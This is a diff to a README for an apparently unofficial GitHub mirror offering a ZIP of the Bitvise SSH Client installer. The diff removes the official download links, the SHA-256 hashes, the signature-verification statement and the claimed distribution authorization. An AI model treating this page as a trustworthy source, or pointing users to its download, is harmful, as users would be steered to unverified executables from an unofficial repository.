@@ -14,15 +14,9 @@ The Bitvise SSH Client installer is available as a ZIP download. The ZIP contain
   <a href="https://github.com/rvtoolsofficial/bitvise-ssh-client-download/releases/latest">Download latest version from Releases</a>
 </p>
 
-The installer was downloaded from Bitvise's official distribution host. Its Authenticode signature was verified as valid and signed by **Bitvise Limited**. Verify the signature again on your computer before running it, using [Bitvise's verification instructions](https://www.bitvise.com/verify-installer-signature).
+The ZIP contains the Bitvise SSH Client 9.66 installer. Extract the archive before running the installer. Review Bitvise license terms and verify the installer’s digital signature before use.
 
-- Official product download page: https://www.bitvise.com/ssh-client-download
-- Original installer: https://dl.bitvise.com/BvSshClient-Inst.exe
-- Installer SHA-256: `F4F0F97A8C55FC03995D87B21FE0E627E68B040646AD5B3DA6F95BAA8A528DD88`
-- ZIP SHA-256: `41C15674673E88BC14FED5F5ADD602F582FB9D1F2567D139F26AB11BAAAB41DDA`
+## License and support
 
-## License and distribution
-
-This mirror is published based on the uploader's statement that they have advance written authorization from Bitvise to distribute the installer. Bitvise SSH Client remains Bitvise's property. Review the current [Bitvise SSH Client EULA](https://www.bitvise.com/ssh-client-license) before use. This repository is not an official Bitvise support channel.
-
+Bitvise SSH Client and the Bitvise name belong to Bitvise Limited. This repository is an independent download page, not an official Bitvise support channel.
 For product setup and security guidance, see the [Bitvise SSH Client guide](https://github.com/rvtoolsofficial/bitvise-ssh-client-guide).
